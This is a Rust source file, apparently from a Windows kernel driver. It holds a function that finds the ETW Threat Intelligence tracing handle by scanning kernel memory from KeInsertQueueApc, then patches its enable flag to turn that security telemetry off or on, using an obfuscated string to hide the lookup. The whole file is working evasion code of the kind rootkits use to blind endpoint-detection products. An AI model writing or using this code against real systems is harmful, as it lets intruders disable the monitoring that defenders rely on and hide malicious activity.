use {
    crate::{
        internals::structs::TRACE_ENABLE_INFO, 
        utils::{
            uni,
            patterns::{
                scan_for_pattern, ETWTI_PATTERN
            }, 
        }
    }, 
    obfstr::obfstr, 
    shared::structs::ETWTI, 
    wdk_sys::{
        ntddk::MmGetSystemRoutineAddress, 
        NTSTATUS, STATUS_UNSUCCESSFUL
    }
};

/// Represents ETW in the operating system.
pub struct Etw;

impl Etw {
    /// Enables or disables ETW tracing by manipulating the `ETWTI` structure.
    ///
    /// # Arguments
    /// 
    /// - `info`: A pointer to an `ETWTI` structure, which contains information on whether to enable or disable ETW tracing.
    ///
    /// # Returns
    /// 
    /// - `NTSTATUS`: A status code indicating success or failure of the operation.
    ///
    pub unsafe fn etwti_enable_disable(info: *mut ETWTI) -> Result<(), NTSTATUS> {
        let mut function_name = uni::str_to_unicode(obfstr!("KeInsertQueueApc")).to_unicode();
        let function_address = MmGetSystemRoutineAddress(&mut function_name);
        let etwi_handle = scan_for_pattern(function_address, &ETWTI_PATTERN, 5, 9, 0x1000, u32::from_le_bytes).ok_or(STATUS_UNSUCCESSFUL)?;
        let trace_info = etwi_handle.offset(0x20).offset(0x60) as *mut TRACE_ENABLE_INFO;
        (*trace_info).is_enabled = if (*info).enable {
            0x01
        } else {
            0x00
        }; 

        Ok(())
    }
}

